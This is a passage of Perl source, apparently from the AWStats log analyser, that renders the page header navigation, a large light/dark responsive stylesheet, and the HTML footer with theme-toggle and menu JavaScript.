		my $body_class = ($FrameName eq 'mainleft') ? 'class="aws-sidebar"' : 'class="aws-main"';
		print "<body $body_class>";
		print "<div class=\"aws-container\">";

		# UI Language Text Translations
		my $light_mode_text           = _t("Switch to light mode");
		my $dark_mode_text            = _t("Switch to dark mode");
		my $title                     = _t("AWStats Log Viewer");
		my $back_to_top_text          = _t("Back to top");
		
		# Navigation Categories
		my $nav_category_basic        = _t("nav_category_basic");
		my $nav_category_guide        = _t("nav_category_guide");
		my $nav_category_reference    = _t("nav_category_reference");
		my $nav_category_integration  = _t("nav_category_integration");
		my $nav_category_dev          = _t("nav_category_dev");
		
		# Document Links Localization
		my $nav_changelog   = _t("nav_changelog");
		my $nav_what        = _t("nav_what");
		my $nav_license     = _t("nav_license");
		my $nav_glossary    = _t("nav_glossary");
		my $nav_setup       = _t("nav_setup");
		my $nav_upgrade     = _t("nav_upgrade");
		my $nav_config      = _t("nav_config");
		my $nav_extra       = _t("nav_extra");
		my $nav_tools       = _t("nav_tools");
		my $nav_faq         = _t("nav_faq");
		my $nav_security    = _t("nav_security");
		my $nav_compare     = _t("nav_compare");
		my $nav_benchmark   = _t("nav_benchmark");
		my $nav_webmin      = _t("nav_webmin");
		my $nav_dolibarr    = _t("nav_dolibarr");
		my $nav_contrib     = _t("nav_contrib");
		my $nav_plugins     = _t("nav_plugins");
		my $nav_hooks       = _t("nav_hooks");
		my $nav_graphs      = _t("nav_graphs");

		# --- Optimized Time & Configuration Handling ---
		my ($year, $month) = split('-', strftime("%Y-%m", localtime));

		if (!$SiteConfig) {
			$SiteConfig = $ENV{'HTTP_HOST'} || $ENV{'SERVER_NAME'} || 'default';
			$SiteConfig =~ s/:\d+$//;
		}
		Read_Config();
		
		my $target = "/cgi-bin/awstats.pl?config=$SiteConfig&framename=mainright&year=$year&month=$month";

print <<"END_BUTTON";
<div class="header-right">
	<div class="dropdown-menu" id="mobileMenu">
		<div class="dropdown-item">
			<div class="dropdown-title">📌 $nav_category_basic</div>
			<div class="dropdown-content">
				<a href="$target&doc=changelog" target="doc-frame">$nav_changelog</a>
				<a href="$target&doc=what" target="doc-frame">$nav_what</a>
				<a href="$target&doc=license" target="doc-frame">$nav_license</a>
				<a href="$target&doc=glossary" target="doc-frame">$nav_glossary</a>
			</div>
		</div>
		<div class="dropdown-item">
			<div class="dropdown-title">📘 $nav_category_guide</div>
			<div class="dropdown-content">
				<a href="$target&doc=setup" target="doc-frame">$nav_setup</a>
				<a href="$target&doc=upgrade" target="doc-frame">$nav_upgrade</a>
				<a href="$target&doc=config" target="doc-frame">$nav_config</a>
				<a href="$target&doc=extra" target="doc-frame">$nav_extra</a>
				<a href="$target&doc=tools" target="doc-frame">$nav_tools</a>
			</div>
		</div>
		<div class="dropdown-item">
			<div class="dropdown-title">📚 $nav_category_reference</div>
			<div class="dropdown-content">
				<a href="$target&doc=faq" target="doc-frame">$nav_faq</a>
				<a href="$target&doc=security" target="doc-frame">$nav_security</a>
				<a href="$target&doc=compare" target="doc-frame">$nav_compare</a>
				<a href="$target&doc=benchmark" target="doc-frame">$nav_benchmark</a>
			</div>
		</div>
		<div class="dropdown-item">
			<div class="dropdown-title">🧩 $nav_category_integration</div>
			<div class="dropdown-content">
				<a href="$target&doc=webmin" target="doc-frame">$nav_webmin</a>
				<a href="$target&doc=dolibarr" target="doc-frame">$nav_dolibarr</a>
				<a href="$target&doc=contrib" target="doc-frame">$nav_contrib</a>
			</div>
		</div>
		<div class="dropdown-item">
			<div class="dropdown-title">💻 $nav_category_dev</div>
			<div class="dropdown-content">
				<a href="$target&doc=dev_plugins" target="doc-frame">$nav_plugins</a>
				<a href="$target&doc=dev_hooks" target="doc-frame">$nav_hooks</a>
				<a href="$target&doc=dev_graphs" target="doc-frame">$nav_graphs</a>
			</div>
		</div>
	</div>
	<button id="theme-toggle" 
			class="theme-toggle" 
			onclick="toggleTheme()" 
			data-light-mode="$light_mode_text"
			data-dark-mode="$dark_mode_text"
			aria-label="$dark_mode_text">
		🌙
	</button>
</div>
END_BUTTON

print <<"END_BACK_TO_TOP";
<button id="back-to-top" class="back-to-top" aria-label="$back_to_top_text" title="$back_to_top_text" style="display: none;">
	<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
		<polyline points="18 15 12 9 6 15"></polyline>
	</svg>
	<span>$back_to_top_text</span>
</button>
END_BACK_TO_TOP
		}
	print '<div id="doc-frame-bar" style="display:none; position:sticky; top:60px; z-index:999; background:var(--header-bg); padding:8px 20px; border-bottom:1px solid var(--border-color); margin-top:20px;">';
	print '<div style="display:flex; justify-content:flex-end; align-items:center;">';
	print '<span style="flex:1; font-weight:500;">' . _t("Documentation Viewer") . '</span>';
	print '<button id="doc-frame-close" style="background:none; border:none; cursor:pointer; font-size:16px; color:var(--text-color);" title="' . _t("Close") . '">✖</button>';
	print '</div>';
	print '</div>';
	print '<div id="doc-frame-container" style="display:none;">';
	print '<iframe name="doc-frame" id="doc-frame" style="width:100%; height:600px; border:1px solid var(--border-color); border-radius:0 0 8px 8px;" title="' . _t("Documentation Viewer") . '"></iframe>';
	print '</div>';
	$HeaderHTMLSent++;
}

#------------------------------------------------------------------------------
# Function:     Return complete modern CSS for AWStats UI
# Description:  Returns a <style> block with ~700 lines of CSS covering:
#               - Light/dark theme (CSS variables, data-theme toggle)
#               - RTL/LTR layout support
#               - Responsive design (mobile, tablet, desktop)
#               - Tables, charts, buttons, forms, dropdown menus
#               - Documentation viewer frame, back-to-top button
#               - Error/success/warning message styling
#               - Legacy color variable overrides for backward compatibility
# Parameters:   $dir - 'ltr' or 'rtl' (affects directional selectors)
# Return:       Complete CSS string (embedded in <style> tag)
#------------------------------------------------------------------------------
sub get_modern_css {
	my $dir = shift;
	
	return <<'END_CSS';
<style>
:root {
	--primary-color: #2563eb;
	--secondary-color: #1e40af;
	--text-color: #1f2937;
	--bg-color: #ffffff;
	--border-color: #e5e7eb;
	--hover-color: #dbeafe;
	--header-bg: #f1f5f9;
	--card-bg: #ffffff;
	--alt-row-bg: #f9fafb;
	--shadow: 0 1px 3px rgba(0,0,0,0.1);
	--link-color: #2563eb;
	--link-hover: #1e40af;
	--error-color: #dc2626;
	--warning-color: #d97706;
	--success-color: #059669;
	--font-family: system-ui, -apple-system, sans-serif;
	
	--color-day-bg: #ECECEC;
	--color-visits-bg: #F4F090;
	--color-pages-bg: #4477DD;
	--color-hits-bg: #66EEFF;
	--color-bandwidth-bg: #2EA495;
	--color-weekend-bg: #EAEAEA;
	--color-table-border: #ECECEC;
	--color-text-default: #000000;
	--color-titletext: #000000;
	--color-link: #0011BB;
	--color-hover: #605040;
	--color-table-bg: #CCCCDD;
	--color-table-title: #000000;
	--surface-secondary: #f1f5f9;
	--header-bg-rgb: 241, 245, 249;
}

[data-theme="dark"] {
	--primary-color: #60a5fa;
	--secondary-color: #3b82f6;
	--text-color: #f3f4f6;
	--bg-color: #1f2937;
	--border-color: #374151;
	--hover-color: #2d3748;
	--header-bg: #1e293b;
	--card-bg: #2d3748;
	--alt-row-bg: #374151;
	--shadow: 0 1px 3px rgba(0,0,0,0.3);
	--link-color: #60a5fa;
	--link-hover: #93c5fd;
	--error-color: #f87171;
	--warning-color: #fbbf24;
	--success-color: #34d399;
	--surface-secondary: #334155;
	--header-bg-rgb: 30, 41, 59;

	--color-day-bg: #2d3748;
	--color-visits-bg: #8B5F1C;
	--color-pages-bg: #1E3A8A;
	--color-hits-bg: #0B5E6B;
	--color-bandwidth-bg: #0F5E52;
	--color-weekend-bg: #374151;
	--color-table-border: #374151;
	--color-text-default: #f3f4f6;
	--color-titletext: #f3f4f6;
	--color-link: #60a5fa;
	--color-hover: #93c5fd;
	--color-table-bg: #1e293b;
	--color-table-title: #f3f4f6;
}

* {
	transition: background-color 0.3s ease, border-color 0.3s ease, color 0.2s ease;
}

.aws_border,
table.aws_border {
	border: 1px solid var(--color-table-border);
	border-radius: 8px;
	overflow: hidden;
	background-color: var(--bg-color);
}

.aws_data,
table.aws_data {
	border-collapse: collapse;
	width: 100%;
	border: 1px solid var(--color-table-border);
}

.aws_data td,
.aws_data th,
table.aws_data td,
table.aws_data th {
	border: 1px solid var(--color-table-border);
	padding: 6px 8px;
}

tr td.awsm,
tr td[class="awsm"] {
	border: 1px solid var(--color-table-border);
}

body {
	font-family: var(--font-family);
	font-size: 14px;
	line-height: 1.5;
	color: var(--text-color);
	background-color: var(--bg-color);
	margin: 0;
	padding: 20px;
}

a, a:link, a:visited {
	text-decoration: none;
	color: var(--link-color);
	transition: color 0.2s ease;
}

a:hover {
	color: var(--accent);
}

a:visited {
	color: var(--link-color);
}

.aws-container {
	max-width: 1400px;
	margin: 0 auto;
}

.aws-sidebar {
	background: var(--header-bg);
	padding: 15px;
	border-right: 1px solid var(--border-color);
}

.aws-main {
	background: var(--bg-color);
}

.aws-border {
	background-color: var(--header-bg);
	border-radius: 8px;
	padding: 10px;
	margin-bottom: 20px;
}

.aws-title {
	font-size: 18px;
	font-weight: 600;
	color: var(--primary-color);
	text-align: center;
	margin-bottom: 10px;
	padding: 10px;
	background: var(--header-bg);
	border-radius: 6px;
}

.aws-data {
	width: 100%;
	overflow-x: visible;
	margin-bottom: 20px;
}

.aws-chart {
	width: 100%;
	margin-bottom: 20px;
}

.aws-whitespace {
	background: var(--header-bg);
}

.aws-note {
	font-size: 18px;
	color: var(--text-color);
	opacity: 0.7;
	padding: 8px;
	background: var(--header-bg);
	border-radius: 4px;
	margin-top: 8px;
}

table {
	border-collapse: collapse;
	background-color: var(--card-bg);
	border: 1px solid var(--border-color);
	border-radius: 8px;
	width: 100%;
}

th {
	background-color: var(--header-bg);
	color: var(--text-color);
	font-weight: 600;
	padding: 8px;
	text-align: center;
	border-bottom: 1px solid var(--border-color);
}

td {
	padding: 6px 8px;
	text-align: center;
	border-bottom: 1px solid var(--border-color);
	color: var(--text-color);
}

td.aws {
	border-color: var(--border-color);
	border-left-width: 0px;
	border-right-width: 1px;
	border-top-width: 0px;
	border-bottom-width: 1px;
	text-align: left;
	color: var(--text-color);
	padding: 0px;
}

td.aws:has(img) {
	text-align: left;
}

td.aws:has(img) img {
	display: block;
	float: left;
	clear: left;
	margin: 1px 0;
}

table tr:nth-child(even) {
	background-color: var(--card-bg);
}

table tr:nth-child(odd) {
	background-color: var(--alt-row-bg);
}

table tr:hover {
	background-color: var(--hover-color);
}

tr:last-child td {
	border-bottom: none;
}

.currentday {
	font-weight: 700;
	color: var(--primary-color);
}

.aws-data-table {
	width: 100%;
	border-collapse: collapse;
	background-color: var(--card-bg);
	border: 1px solid var(--border-color);
}

.aws-data-table th,
.aws-data-table td {
	padding: 6px;
	text-align: center;
	border: 1px solid var(--border-color);
	color: var(--text-color);
}

.aws-data-table th {
	background-color: var(--header-bg);
	font-weight: 600;
}

.aws-data-table.ip-table th:first-child,
.aws-data-table.ip-table td:first-child,
.aws-data-table.robot-table th:first-child,
.aws-data-table.robot-table td:first-child {
	width: 80px;
	min-width: 80px;
	max-width: 80px;
	word-break: break-word;
}

.aws-formfield {
	padding: 8px 12px;
	border: 1px solid var(--border-color);
	border-radius: 4px;
	font-size: 14px;
	background-color: var(--card-bg);
	color: var(--text-color);
}

.aws-button {
	color: white;
	border: none;
	padding: 8px 16px;
	border-radius: 4px;
	cursor: pointer;
	font-size: 14px;
	transition: background-color 0.2s;
}

.aws-button:hover {
	background-color: var(--secondary-color);
}

.theme-toggle-container {
	position: sticky;
	top: 10px;
	right: 10px;
	z-index: 1000;
	display: flex;
	justify-content: flex-end;
	padding: 10px;
}

.theme-toggle {
	background: var(--card-bg);
	border: 1px solid var(--border-color);
	border-radius: 30px;
	padding: 8px 16px;
	cursor: pointer;
	font-size: 18px;
	box-shadow: var(--shadow);
	transition: all 0.3s ease;
	color: var(--text-color);
}

.theme-toggle:hover {
	transform: scale(1.05);
	box-shadow: 0 4px 6px rgba(0,0,0,0.1);
}

.theme-toggle:focus {
	outline: 2px solid var(--primary-color);
	outline-offset: 2px;
}

.aws-footer {
	margin-top: 40px;
	padding: 20px;
	text-align: center;
	border-top: 1px solid var(--border-color);
	color: var(--text-color);
	font-size: 12px;
}

.aws-footer a {
	color: var(--primary-color);
}

.aws-footer-note {
	margin-top: 10px;
	font-size: 11px;
	opacity: 0.8;
}

.error-text {
	color: var(--error-color);
	font-weight: 600;
}

.warning-message {
	color: var(--warning-color);
	border-left: 4px solid var(--warning-color);
	background-color: var(--card-bg);
	padding: 12px 16px;
	margin: 10px 0;
	border-radius: 4px;
}

.info-text {
	color: var(--text-color);
	opacity: 0.9;
}

.success-text {
	color: var(--success-color);
}

.error-card {
	background: var(--card-bg);
	border: 1px solid #ef4444;
	border-radius: 8px;
	padding: 20px;
	margin: 20px 0;
	box-shadow: var(--shadow);
}

.help-card {
	background: var(--card-bg);
	border: 1px solid var(--border-color);
	border-radius: 8px;
	padding: 20px;
	margin: 20px 0;
}

.code-block {
	background: var(--header-bg);
	padding: 12px;
	border-radius: 4px;
	font-family: monospace;
	overflow-x: auto;
	border: 1px solid var(--border-color);
	color: var(--text-color);
	white-space: pre-wrap;
	word-wrap: break-word;
}

.back-to-top {
	position: fixed;
	bottom: 30px;
	right: 30px;
	display: flex;
	align-items: center;
	gap: 8px;
	padding: 12px 18px;
	background: var(--primary-color);
	color: white;
	border: none;
	border-radius: 40px;
	cursor: pointer;
	font-size: 14px;
	font-weight: 500;
	box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
	transition: all 0.3s ease;
	z-index: 1000;
	opacity: 0.9;
}

.back-to-top:hover {
	transform: translateY(-3px);
	box-shadow: 0 6px 16px rgba(0, 0, 0, 0.2);
	opacity: 1;
	background: var(--secondary-color);
}

.back-to-top svg {
	stroke: white;
}

#doc-frame-bar {
	backdrop-filter: blur(8px);
	box-shadow: 0 2px 4px rgba(0,0,0,0.1);
}

#doc-frame-container iframe {
	border-top: none;
}

.dropdown-item {
	position: relative;
}

.header-right {
	display: flex;
	align-items: center;
	justify-content: space-between;
	position: sticky;
	top: 0;
	z-index: 1000;
	background: var(--header-bg);
	padding: 10px 20px;
	border-bottom: 1px solid var(--border-color);
	box-shadow: var(--shadow);
	backdrop-filter: blur(10px);
	background-color: rgba(var(--header-bg-rgb), 0.95);
}

.dropdown-title {
	cursor: pointer;
	padding: 8px 16px;
	background: var(--surface-secondary);
	border: 1px solid var(--border-color);
	border-radius: 30px;
	font-weight: 500;
	color: var(--text-color);
	transition: all 0.2s;
	white-space: nowrap;
	user-select: none;
}

.dropdown-title:hover {
	background: var(--hover-color);
	color: var(--link-color);
	border-color: var(--link-color);
}

.dropdown-menu {
	display: flex;
	gap: 15px;
	position: relative;
	flex-wrap: wrap;
	z-index: 1001;
}

.dropdown-content {
	display: none;
	position: absolute;
	top: 100%;
	left: 0;
	min-width: max-content;
	background: var(--card-bg);
	border: 1px solid var(--border-color);
	border-radius: 16px;
	padding: 12px;
	box-shadow: var(--shadow);
	z-index: 1000;
	margin-top: 8px;
}

.dropdown-item.active .dropdown-content {
	display: flex;
	flex-direction: column;
	gap: 4px;
}

.dropdown-content a {
	display: block;
	padding: 8px 16px;
	color: var(--text-color);
	text-decoration: none;
	border-radius: 20px;
	transition: all 0.2s;
	font-size: 0.95rem;
	background: var(--surface-secondary);
	border: 1px solid var(--border-color);
}

.dropdown-content a:hover {
	background: var(--hover-color);
	color: var(--link-color);
	border-color: var(--link-color);
	transform: translateX(4px);
}

[data-theme="dark"] .error-text {
	color: #f87171;
}

[data-theme="dark"] .error-card {
	border-color: #f87171;
}

[data-theme="dark"] .warning-message {
	border-left-color: #fbbf24;
}

[data-theme="dark"] .currentday {
	color: var(--primary-color);
}

[data-theme="dark"] .back-to-top {
	background: var(--primary-color);
	box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
}

[data-theme="dark"] .back-to-top:hover {
	background: var(--secondary-color);
}

[data-theme="dark"] [bgcolor="#ECECEC"],
[data-theme="dark"] td[bgcolor="#ECECEC"],
[data-theme="dark"] th[bgcolor="#ECECEC"] {
	background-color: var(--color-day-bg) !important;
	color: var(--text-color) !important;
}

[data-theme="dark"] [bgcolor="#F4F090"],
[data-theme="dark"] td[bgcolor="#F4F090"],
[data-theme="dark"] th[bgcolor="#F4F090"] {
	background-color: var(--color-visits-bg) !important;
	color: var(--text-color) !important;
}

[data-theme="dark"] [bgcolor="#4477DD"],
[data-theme="dark"] td[bgcolor="#4477DD"],
[data-theme="dark"] th[bgcolor="#4477DD"] {
	background-color: var(--color-pages-bg) !important;
	color: var(--text-color) !important;
}

[data-theme="dark"] [bgcolor="#66EEFF"],
[data-theme="dark"] td[bgcolor="#66EEFF"],
[data-theme="dark"] th[bgcolor="#66EEFF"] {
	background-color: var(--color-hits-bg) !important;
	color: var(--text-color) !important;
}

[data-theme="dark"] [bgcolor="#2EA495"],
[data-theme="dark"] td[bgcolor="#2EA495"],
[data-theme="dark"] th[bgcolor="#2EA495"] {
	background-color: var(--color-bandwidth-bg) !important;
	color: var(--text-color) !important;
}

[data-theme="dark"] [bgcolor="#EAEAEA"],
[data-theme="dark"] td[bgcolor="#EAEAEA"] {
	background-color: var(--color-weekend-bg) !important;
	color: var(--text-color) !important;
}

[data-theme="dark"] [bgcolor="#CCCCDD"],
[data-theme="dark"] td[bgcolor="#CCCCDD"] {
	background-color: var(--color-table-bg) !important;
	color: var(--text-color) !important;
}

[data-theme="dark"] [bgcolor="#F6F6F6"],
[data-theme="dark"] td[bgcolor="#F6F6F6"] {
	background-color: var(--header-bg) !important;
	color: var(--text-color) !important;
}

[dir="rtl"] .aws-sidebar {
	border-right: none;
	border-left: 1px solid var(--border-color);
}

[dir="rtl"] .theme-toggle-container {
	left: 10px;
	right: auto;
}

[dir="rtl"] .robot-table td.aws:first-child {
	unicode-bidi: bidi-override;
	direction: rtl;
	text-align: right;
}

[dir="rtl"] td.number, 
[dir="rtl"] td.numeric {
	text-align: left;
}

[dir="rtl"] .back-to-top {
	right: auto;
	left: 30px;
}

[dir="rtl"] .footer-line {
	unicode-bidi: bidi-override;
	direction: rtl;
}

@media (max-width: 768px) {
	body { 
		padding: 10px; 
	}
	
	th, td { 
		padding: 4px 6px; 
		font-size: 12px; 
	}
	
	.aws-title { 
		font-size: 16px; 
		width: 100% !important;
		box-sizing: border-box;
	}
	
	.header-right {
		width: 100%;
		box-sizing: border-box;
		margin: 0;
		padding: 10px 15px;
		left: 0;
		right: 0;
	}
	
	.dropdown-menu {
		display: none;
		position: absolute;
		top: 100%;
		left: 0;
		right: 0;
		background: var(--card-bg);
		flex-direction: column;
		padding: 20px;
		box-shadow: var(--shadow);
		z-index: 1001;
	}
	
	.dropdown-menu.mobile-active {
		display: flex;
	}
	
	.dropdown-item {
		width: 100%;
		margin-bottom: 8px;
	}
	
	.dropdown-title {
		width: 100%;
		display: flex;
		justify-content: space-between;
		align-items: center;
	}
	
	.dropdown-title::after {
		content: "▼";
		font-size: 0.7rem;
		transition: transform 0.2s;
	}
	
	.dropdown-item.active .dropdown-title::after {
		transform: rotate(180deg);
	}
	
	.dropdown-content {
		position: static;
		width: 100%;
		margin-top: 8px;
		box-shadow: none;
		border: none;
		padding: 8px;
	}
	
	.theme-toggle-container { 
		top: 5px; 
		right: 5px; 
	}
	
	.theme-toggle { 
		padding: 6px 12px; 
		font-size: 16px; 
	}
	
	.back-to-top {
		bottom: 20px;
		right: 20px;
		padding: 10px 14px;
		gap: 6px;
	}
	
	.back-to-top span {
		font-size: 12px;
	}
	
	.back-to-top svg {
		width: 16px;
		height: 16px;
	}
	
	[dir="rtl"] .back-to-top {
		left: 20px;
		right: auto;
	}
	
	.aws_data {
		position: relative;
		padding-top: 60px;
	}
	
	.aws_data tr:first-child td:nth-child(3) {
		position: absolute;
		top: 5px;
		right: 5px;
		display: block !important;
		border: none;
		background: none;
		padding: 0;
	}
  
	.aws_data tr:first-child td:nth-child(3) img {
		width: 40px;
		height: auto;
		max-width: 40px;
	}
	
	.aws_data tr:first-child td:first-child {
		display: block;
		width: 100%;
		font-weight: bold;
		margin-top: 5px;
		border: none;
	}
	
	.aws_data tr:first-child td:nth-child(2) {
		display: block;
		width: 100%;
		margin-bottom: 15px;
		border: none;
	}
	
	.aws_data tr:nth-child(2) td,
	.aws_data tr:nth-child(3) td {
		display: block;
		width: 100%;
		padding: 4px 0;
	}
	
	.aws_data tr:nth-child(2) td:first-child,
	.aws_data tr:nth-child(3) td:first-child {
		font-weight: bold;
	}
	
	.aws_data tr:nth-child(2) td:nth-child(2),
	.aws_data tr:nth-child(3) td:nth-child(2) {
		padding-left: 10px;
	}
	
	.aws-chart {
		overflow-x: auto;
		display: block;
	}
	
	.aws-chart table {
		min-width: 550px;
		width: auto;
	}
	
	.aws-chart td,
	.aws-chart th {
		font-size: 11px;
		padding: 6px 4px;
		white-space: nowrap;
	}
	
	.aws-chart td:first-child {
		white-space: normal;
	}
	
	.aws-chart table td[align="center"] {
		overflow-x: auto;
		display: block;
	}
	
	.aws-chart table td[align="center"] center {
		overflow-x: auto;
		display: block;
		min-width: 500px;
	}

	table[width="100%"][cellpadding="0"][cellspacing="0"] {
		display: block;
	}
	
	table[width="100%"][cellpadding="0"][cellspacing="0"] tbody {
		display: block;
	}
	
	table[width="100%"][cellpadding="0"][cellspacing="0"] tr {
		display: flex;
		flex-direction: column;
	}
	
	table[width="100%"][cellpadding="0"][cellspacing="0"] td {
		display: block;
		width: 100% !important;
		padding: 0 !important;
	}
	
	table[width="100%"][cellpadding="0"][cellspacing="0"] td:has(&nbsp;) {
		display: none;
	}
	
	.aws-chart {
		margin-bottom: 20px;
		width: 100%;
	}
}
</style>
END_CSS
}

#------------------------------------------------------------------------------
# Function:     Write HTML footer
# Parameters:   $listplugins (0/1)
# Input:        %HTMLOutput, $HTMLEndSection, $FrameName, $color_text
# Output:       None
# Return:       None
#------------------------------------------------------------------------------
sub html_end {
	my $listplugins = shift || 0;
	
	return unless scalar keys %HTMLOutput;
		
	# --- 1. Extensible Body Footer Plugins Hook ---
	foreach my $pluginname ( keys %{ $PluginsLoaded{'AddHTMLBodyFooter'} } ) {
		my $function = "AddHTMLBodyFooter_$pluginname";
		no strict 'refs';
		&$function();
	}

	# --- 2. Render HTML Footer Block (Content Pages Only) ---
	if ( $FrameName ne 'index' && $FrameName ne 'mainleft' ) {
		print "</div> <!-- .aws-container -->\n";
		print "<footer class=\"aws-footer\">\n";
		print "<p class=\"footer-line\">\n";
		
		my $brand_text = _t("Advanced Web Statistics");
		print "<b>$brand_text <a href=\"https://github.com\" target=\"_blank\" rel=\"noopener noreferrer\">$VERSION</a></b>\n<br>\n";
		
		my $copyright_text = _t("Copyright");
		my $team_text      = _t("AWStats Team");
		print "$copyright_text &copy; <span id=\"copyright-year\">1997</span> $team_text\n";
		
		my $github_icon = "<a href=\"https://github.com\" target=\"_blank\" rel=\"noopener\"><img src=\"$DirIcons/os/github.svg\" alt=\"GitHub\" style=\"width:16px; height:16px; vertical-align:middle;\"></a>";
		my $created_by_text = sprintf(_t("Created by"), $github_icon);
		print " | $created_by_text <a href=\"https://awstats.org\" target=\"_blank\" rel=\"noopener\">$PROG</a>";
		
		if ($listplugins) {
			my @plugins = keys %{ $PluginsLoaded{'init'} };
			#if (@plugins) {
			#    printf(" (%s: %s)", 
			#        _t("plugins"), 
			#        join(', ', @plugins)
			#    );
			#}
			if (@plugins) {
				my @display_plugins = @plugins;
				for (my $i = 0; $i < @display_plugins; $i++) {
					if ($display_plugins[$i] eq 'geoipfree') {
						my $dbip_by = _t("dbip by");
						my $ipdb_by = _t("IPDB by");
						$display_plugins[$i] = "geoipfree - $dbip_by <a href=\"https://db-ip.com\" target=\"_blank\" rel=\"noopener\" title=\"$ipdb_by\">dbip</a>";
					}
				}
				my $plugins_label = _t("plugins");
				my $plugins_joined = join(', ', @display_plugins);
				print " ($plugins_label: $plugins_joined)";
			}
		}
		
		print "</p>\n";
		print "<p class=\"footer-note-line\">" . _t($HTMLEndSection) . "</p>\n" if $HTMLEndSection;
		print "</footer>\n";
	}
	print <<'END_SCRIPT';
<script>
(function() {
	const savedTheme = localStorage.getItem('awstats-theme');
	const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
	if (savedTheme === 'dark' || (!savedTheme && prefersDark)) {
		document.documentElement.setAttribute('data-theme', 'dark');
		if (document.readyState === 'loading') {
			document.addEventListener('DOMContentLoaded', () => updateThemeIcon('dark'));
		} else {
			updateThemeIcon('dark');
		}
	} else {
		if (document.readyState === 'loading') {
			document.addEventListener('DOMContentLoaded', () => updateThemeIcon('light'));
		} else {
			updateThemeIcon('light');
		}
	}
})();

document.addEventListener('DOMContentLoaded', function() {
	const customSelect = document.querySelector('.custom-select');
	if (customSelect) {
		const selected = customSelect.querySelector('.select-selected');
		const items = customSelect.querySelectorAll('.select-items div');

		selected.addEventListener('click', function() {
			customSelect.classList.toggle('active');
		});

		items.forEach(item => {
			item.addEventListener('click', function() {
				const value = this.getAttribute('data-value');
				const text = this.textContent;

				selected.textContent = text;
				selected.setAttribute('data-value', value);

				document.getElementById('langSelector').value = value;
				document.getElementById('langSelector').dispatchEvent(new Event('change'));

				customSelect.classList.remove('active');
			});
		});

		document.addEventListener('click', function(e) {
			if (!customSelect.contains(e.target)) {
				customSelect.classList.remove('active');
			}
		});
	}

	const bar = document.getElementById('doc-frame-bar');
	const container = document.getElementById('doc-frame-container');
	const frame = document.getElementById('doc-frame');
	const closeBtn = document.getElementById('doc-frame-close');

	if (frame) {
		frame.addEventListener('load', function() {
			if (this.contentWindow.location.href !== 'about:blank') {
				bar.style.display = 'block';
				container.style.display = 'block';
			}
		});
	}

	if (closeBtn) {
		closeBtn.addEventListener('click', function() {
			bar.style.display = 'none';
			container.style.display = 'none';
			frame.src = 'about:blank';
		});
	}

	const mobileToggle = document.getElementById('mobileMenuToggle');
	const mobileMenu = document.getElementById('mobileMenu');
	if (mobileToggle && mobileMenu) {
		mobileToggle.addEventListener('click', function() {
			mobileMenu.classList.toggle('mobile-active');
			mobileToggle.innerHTML = mobileMenu.classList.contains('mobile-active') ? '✕' : '☰';
		});
	}

	const dropdownItems = document.querySelectorAll('.dropdown-item');
	document.addEventListener('click', function(event) {
		if (!event.target.closest('.dropdown-item')) {
			dropdownItems.forEach(item => item.classList.remove('active'));
		}
	});

	dropdownItems.forEach(item => {
		const title = item.querySelector('.dropdown-title');
		title.addEventListener('click', function(e) {
			e.stopPropagation();
			dropdownItems.forEach(otherItem => {
				if (otherItem !== item) otherItem.classList.remove('active');
			});
			item.classList.toggle('active');
		});
		const content = item.querySelector('.dropdown-content');
		if (content) {
			content.addEventListener('click', e => e.stopPropagation());
		}
	});

	document.addEventListener('keydown', function(e) {
		if (e.key === 'Escape') {
			dropdownItems.forEach(item => item.classList.remove('active'));
		}
	});
});

document.addEventListener('DOMContentLoaded', function() {
	const mobileToggle = document.getElementById('mobileMenuToggle');
	const mobileMenu = document.getElementById('mobileMenu');
	
	if (mobileToggle && mobileMenu) {
		mobileToggle.addEventListener('click', function() {
			mobileMenu.classList.toggle('mobile-active');
			
			if (mobileMenu.classList.contains('mobile-active')) {
				mobileToggle.innerHTML = '✕';
			} else {
				mobileToggle.innerHTML = '☰';
			}
		});
	}
});

function toggleTheme() {
	const html = document.documentElement;
	const currentTheme = html.getAttribute('data-theme');
	const newTheme = currentTheme === 'dark' ? 'light' : 'dark';
	html.setAttribute('data-theme', newTheme);
	localStorage.setItem('awstats-theme', newTheme);
	updateThemeIcon(newTheme);
	try {
		const navFrame = document.getElementById('nav');
		if (navFrame && navFrame.contentWindow) {
			navFrame.contentWindow.postMessage({ theme: newTheme }, '*');
		}
	} catch(e) {}
}

function updateThemeIcon(theme) {
	const btn = document.getElementById('theme-toggle');
	if (btn) {
		btn.innerHTML = theme === 'dark' ? '☀️' : '🌙';
		btn.setAttribute('aria-label',
			theme === 'dark' ? btn.dataset.lightMode : btn.dataset.darkMode
		);
	}
}

window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', e => {
	if (!localStorage.getItem('awstats-theme')) {
		const newTheme = e.matches ? 'dark' : 'light';
		document.documentElement.setAttribute('data-theme', newTheme);
		updateThemeIcon(newTheme);
		try {
			const navFrame = document.getElementById('nav');
			if (navFrame && navFrame.contentWindow) {
				navFrame.contentWindow.postMessage({ theme: newTheme }, '*');
			}
		} catch(e) {}
	}
});

(function() {
	const backToTopBtn = document.getElementById('back-to-top');
	if (!backToTopBtn) return;
	const SCROLL_THRESHOLD = 300;
	function checkScroll() {
		if (window.pageYOffset > SCROLL_THRESHOLD) {
			backToTopBtn.style.display = 'flex';
		} else {
			backToTopBtn.style.display = 'none';
		}
	}
	function scrollToTop() {
		window.scrollTo({
			top: 0,
			behavior: 'smooth'
		});
	}
	window.addEventListener('scroll', checkScroll);
	backToTopBtn.addEventListener('click', scrollToTop);
	checkScroll();
	const navFrame = document.getElementById('nav');
	if (navFrame) {
		navFrame.addEventListener('load', function() {
			try {
				const navDoc = navFrame.contentDocument || navFrame.contentWindow.document;
				if (navDoc) {
					navDoc.addEventListener('scroll', function() {
						checkScroll();
					});
				}
			} catch(e) {}
		});
	}
})();

(function() {
	const yearSpan = document.getElementById('copyright-year');
	if (yearSpan) {
		const currentYear = new Date().getFullYear();
		yearSpan.textContent = '1997 - ' + currentYear;
	}
})();
</script>
END_SCRIPT

	print "</body>\n";
	print "</html>\n";
}
#------------------------------------------------------------------------------
# Function:		Print on stdout tab header of a chart
# Parameters:	$title $tooltipnb [$width percentage of chart title]
# Input:		None
# Output:		None
# Return:		None
#------------------------------------------------------------------------------
sub tab_head {
		my $title     = shift;
		my $tooltipnb = shift;
		my $width     = shift || 70;
